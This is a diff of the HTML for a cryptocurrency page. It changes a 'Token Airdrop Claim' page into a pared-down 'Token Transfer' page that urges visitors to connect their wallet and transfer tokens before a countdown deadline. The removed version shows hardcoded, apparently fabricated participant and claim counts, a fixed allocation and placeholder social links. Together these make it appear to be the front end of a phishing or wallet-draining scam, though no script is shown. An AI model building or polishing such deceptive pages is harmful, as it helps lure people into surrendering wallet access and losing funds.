@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Token Airdrop Claim</title>
+  <title>Token Transfer</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <link rel="stylesheet" href="style.css">
 </head>
@@ -11,9 +11,9 @@
   <div class="container">
     <div class="card">
       <div class="header">
-        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Token Logo" class="logo">
-        <h1>Token Airdrop</h1>
-        <p class="description">Claim your free tokens before May 9, 2025!</p>
+        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Logo" class="logo">
+        <h1>Token Transfer</h1>
+        <p class="description">Transfer your tokens before May 9, 2025</p>
         
         <div class="countdown">
           <div class="countdown-item">
@@ -31,30 +31,6 @@
           <div class="countdown-item">
             <span id="seconds">00</span>
             <span>Secs</span>
-          </div>
-        </div>
-      </div>
-      
-      <div class="stats">
-        <div class="stat-item">
-          <i class="fas fa-coins"></i>
-          <div>
-            <span class="stat-value">5,000,000</span>
-            <span class="stat-label">Total Tokens</span>
-          </div>
-        </div>
-        <div class="stat-item">
-          <i class="fas fa-users"></i>
-          <div>
-            <span class="stat-value">12,458</span>
-            <span class="stat-label">Participants</span>
-          </div>
-        </div>
-        <div class="stat-item">
-          <i class="fas fa-wallet"></i>
-          <div>
-            <span class="stat-value">3,872</span>
-            <span class="stat-label">Claims</span>
           </div>
         </div>
       </div>
@@ -85,64 +61,13 @@
         </select>
       </div>
       
-      <div class="token-list">
-        <div class="token-item" data-network="ethereum">
-          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">Ethereum</span>
-        </div>
-        <div class="token-item" data-network="bsc">
-          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">BSC</span>
-        </div>
-        <div class="token-item" data-network="polygon">
-          <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">Polygon</span>
-        </div>
-      </div>
-      
-      <div class="claim-card">
-        <div class="claim-info">
-          <span class="claim-label">Your Allocation</span>
-          <span class="claim-amount">1,250 TOK</span>
-        </div>
-        <button id="connectWallet" class="btn">
-          <i class="fas fa-wallet"></i> Connect Wallet & Claim
-        </button>
-      </div>
-      
+      <button id="connectWallet" class="btn">
+        <i class="fas fa-wallet"></i> Connect Wallet & Transfer
+      </button>
       <div id="loader" class="loader"></div>
+      
       <div id="walletInfo" class="wallet-info"></div>
       <div id="status" class="status"></div>
-      
-      <div class="steps">
-        <h3>How to Claim:</h3>
-        <div class="step">
-          <div class="step-number">1</div>
-          <div class="step-content">Connect your wallet</div>
-        </div>
-        <div class="step">
-          <div class="step-number">2</div>
-          <div class="step-content">Verify eligibility</div>
-        </div>
-        <div class="step">
-          <div class="step-number">3</div>
-          <div class="step-content">Sign transaction</div>
-        </div>
-        <div class="step">
-          <div class="step-number">4</div>
-          <div class="step-content">Receive tokens</div>
-        </div>
-      </div>
-      
-      <div class="social-links">
-        <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
-        <a href="#" class="social-link"><i class="fab fa-telegram"></i></a>
-        <a href="#" class="social-link"><i class="fab fa-discord"></i></a>
-        <a href="#" class="social-link"><i class="fab fa-medium"></i></a>
-      </div>
     </div>
   </div>
 
